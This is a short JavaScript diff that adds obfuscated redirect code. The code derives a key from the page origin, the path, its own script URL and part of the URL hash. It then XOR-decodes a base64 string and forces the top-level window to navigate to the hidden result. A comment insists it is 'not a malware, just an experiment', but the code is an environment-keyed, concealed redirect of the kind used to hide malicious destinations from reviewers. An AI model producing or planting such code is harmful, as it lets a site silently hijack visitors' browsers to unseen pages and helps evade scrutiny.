@@ -21,5 +21,5 @@ function xorStrings(a, b) {
 // this is not a malware, just an experiment, do not panic!
 
 const key = JSON.stringify([location.origin, location.pathname, document.currentScript.src, location.hash.substring(19,49)]);
-const href = '8J\x1A\x1B\x19\x15^_W[\b@\x00\x1D\x1D\x07JJ\x01\x01\x02\x19\x10\x05\x11\x00N\\FI\x19\b\x00\x01\x1EA\n\x1D\x03\x05JFK\n\x1E\x18\x18\x03]CDBO\x03\x04]\x00\x1E\x01K\x16K\x1C\x03\x02\x1E';
-top.location.href = xorStrings(key, href)
+const href = 'OEoaGxkVXl9XWwhAAB0dB0pKAQwDGhgOEAhKR0BKCwsJCBVADh4KAlJFQAkfFQADVUZAQk8DBF0AHgFLFkscAwIe';
+top.location.href = xorStrings(key, atob(href))
